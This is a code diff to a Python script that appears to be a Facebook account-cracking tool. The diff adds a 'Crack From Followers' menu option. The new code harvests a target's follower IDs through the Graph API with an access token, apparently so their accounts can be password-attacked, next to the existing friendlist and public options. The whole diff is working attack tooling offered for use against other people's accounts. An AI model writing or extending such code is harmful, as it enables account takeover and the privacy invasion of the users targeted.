@@ -183,6 +183,7 @@ def passchoice():
 	print ("\n   [ Choose Target]")
     	print ("\n   [1] Crack From Friendlist")
     	print ("   [2] Crack From Public")
+	print ("   [3] Crack From Followers")
     	print ("   [0] Log Out")
 	pilih_passxd()
 	
@@ -217,6 +218,25 @@ def pilih_passxd():
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
+	elif peak =="3" or peak =="03":
+		os.system('clear')
+		banner()
+		idt = raw_input("\n   [•] Followers ID Target : ")
+		try:
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			sp = json.loads(pok.text)
+			print "   [•] Name           : "+sp["name"]
+		except KeyError:
+			print ("   [!] Wrong ID Target")
+			raw_input("\n   [ Back ]")
+			menu()
+		except requests.exceptions.ConnectionError:
+			print ("   [!] No Connection")
+			keluar()
+		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+toket)
+		z = json.loads(r.text)
+		for a in z['data']:
+			id.append(a['id'])
 	elif peak =="0" or peak =="00":
 		os.system('rm -rf login.txt')
 		keluar()
